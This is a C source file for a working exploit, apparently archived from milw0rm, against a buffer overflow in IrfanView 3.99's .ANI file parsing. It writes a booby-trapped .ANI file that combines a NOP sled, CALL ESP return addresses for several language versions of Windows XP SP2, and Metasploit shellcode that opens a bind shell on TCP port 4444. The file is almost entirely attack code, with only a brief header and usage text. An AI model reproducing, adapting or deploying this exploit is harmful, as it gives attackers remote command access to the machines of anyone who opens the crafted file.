/*
                IrfanView 3.99 .ANI File Buffer Overflow (Multiple Targets and port bind shell)                 
                
                Old Target:
                     Windows XP Sp2 FR   
                
                New targets:
                     Windows XP SP2 Portuguese Call ESP Addr 
                     Windows XP SP2 English    Call ESP Addr 
          
      Greetz: Ricardo Fiorelli, Marsu (make this possible.. nice job!), Str0ke , Sekure.org guys!
                
                     
*/

#include <stdio.h>
#include <stdlib.h>

/* win32_exec -  EXITFUNC=process Bind TCP port 4444 http://metasploit.com */
char BindShellcode[]=
"\xfc\x6a\xeb\x4d\xe8\xf9\xff\xff\xff\x60\x8b\x6c" 
"\x24\x24\x8b\x45\x3c\x8b\x7c\x05\x78\x01\xef\x8b" 
"\x4f\x18\x8b\x5f\x20\x01\xeb\x49\x8b\x34\x8b\x01" 
"\xee\x31\xc0\x99\xac\x84\xc0\x74\x07\xc1\xca\x0d" 
"\x01\xc2\xeb\xf4\x3b\x54\x24\x28\x75\xe5\x8b\x5f" 
"\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5f\x1c\x01\xeb" 
"\x03\x2c\x8b\x89\x6c\x24\x1c\x61\xc3\x31\xdb\x64" 
"\x8b\x43\x30\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x40" 
"\x08\x5e\x68\x8e\x4e\x0e\xec\x50\xff\xd6\x66\x53" 
"\x66\x68\x33\x32\x68\x77\x73\x32\x5f\x54\xff\xd0" 
"\x68\xcb\xed\xfc\x3b\x50\xff\xd6\x5f\x89\xe5\x66" 
"\x81\xed\x08\x02\x55\x6a\x02\xff\xd0\x68\xd9\x09" 
"\xf5\xad\x57\xff\xd6\x53\x53\x53\x53\x53\x43\x53" 
"\x43\x53\xff\xd0\x66\x68\x11\x5c\x66\x53\x89\xe1" 
"\x95\x68\xa4\x1a\x70\xc7\x57\xff\xd6\x6a\x10\x51" 
"\x55\xff\xd0\x68\xa4\xad\x2e\xe9\x57\xff\xd6\x53" 
"\x55\xff\xd0\x68\xe5\x49\x86\x49\x57\xff\xd6\x50" 
"\x54\x54\x55\xff\xd0\x93\x68\xe7\x79\xc6\x79\x57"
"\xff\xd6\x55\xff\xd0\x66\x6a\x64\x66\x68\x63\x6d" 
"\x89\xe5\x6a\x50\x59\x29\xcc\x89\xe7\x6a\x44\x89" 
"\xe2\x31\xc0\xf3\xaa\xfe\x42\x2d\xfe\x42\x2c\x93" 
"\x8d\x7a\x38\xab\xab\xab\x68\x72\xfe\xb3\x16\xff" 
"\x75\x44\xff\xd6\x5b\x57\x52\x51\x51\x51\x6a\x01"
"\x51\x51\x55\x51\xff\xd0\x68\xad\xd9\x05\xce\x53" 
"\xff\xd6\x6a\xff\xff\x37\xff\xd0\x8b\x57\xfc\x83" 
"\xc4\x64\xff\xd6\x52\xff\xd0\x68\x7e\xd8\xe2\x73" 
"\x53\xff\xd6\xff\xd0";

unsigned char Ani_headers[] = 
"\x52\x49\x46\x46\x2a\x16\x00\x00\x41\x43\x4f\x4e\x4c\x49\x53\x54"
"\x44\x00\x00\x00\x49\x4e\x46\x4f\x49\x4e\x41\x4d\x0a\x00\x00\x00"
"\x4d\x65\x74\x72\x6f\x6e\x6f\x6d\x65\x00\x49\x41\x52\x54\x26\x00"
"\x00\x00\x4d\x61\x72\x73\x75\x70\x69\x6c\x61\x6d\x69\x50\x6f\x77"
"\x61\x40\x68\x6f\x74\x6d\x61\x69\x6c\x2e\x63\x6f\x6d\x20\x4d\x61"
"\x72\x63\x68\x20\x20\x30\x37\x00\x61\x6e\x69\x68\x24\x10\x00\x00"
"\x24";


int main(int argc, char* argv[])
{
	FILE* anifile;
	char evilbuff[1500];
	int ani_size;
	
	printf("[+] IrfanView 3.99 .ANI File Buffer Overflow (Multiple targets / Port bind shellcode )\n");
	printf("[+] Breno Silva Pinto - bsilva[at]sekure.org\n");
	if (argc!=3) {
		printf("[+] Usage: %s <file.ani> <target>\n",argv[0]);
		printf("[+] Targets:\n");
        printf("[+] 1 - Windows Xp Sp2 Portuguese\n");
        printf("[+] 2 - Windows Xp SP2 France\n");
        printf("[+] 3 - Windows Xp SP2 English\n");
        return 0;
	}
	
	ani_size=sizeof(Ani_headers)-1;
	memset(evilbuff,0x90,1500);
	memcpy(evilbuff,Ani_headers,ani_size);
	
	switch (atoi(argv[2])) {
        case 1: /* PORTUGUESE - BR */
             memcpy(evilbuff+ani_size+459,"\x5d\x38\x82\x7c",4); 				/* CALL ESP in Kernel32.dll */
         break;
    	case 2: /* FRA�AIS */
             memcpy(evilbuff+ani_size+459,"\x8b\x51\x81\x7c",4); 				/* CALL ESP in Kernel32.dll */
    	 break;
        case 3: /* ENGLISH */
             memcpy(evilbuff+ani_size+459,"\xd8\x69\x83\x7c",4); 				/* CALL ESP in Kernel32.dll */
         break;
    }
    
	memcpy(evilbuff+ani_size+466,BindShellcode,strlen(BindShellcode));
	memset(evilbuff+ani_size+strlen(BindShellcode)+10,0,1);
	
	anifile=fopen(argv[1],"wb");
	fwrite( evilbuff, 1, sizeof(evilbuff), anifile );
	fclose(anifile);
	printf(".ANI file created\n");
	return 0;
	
}

// milw0rm.com [2007-04-09]
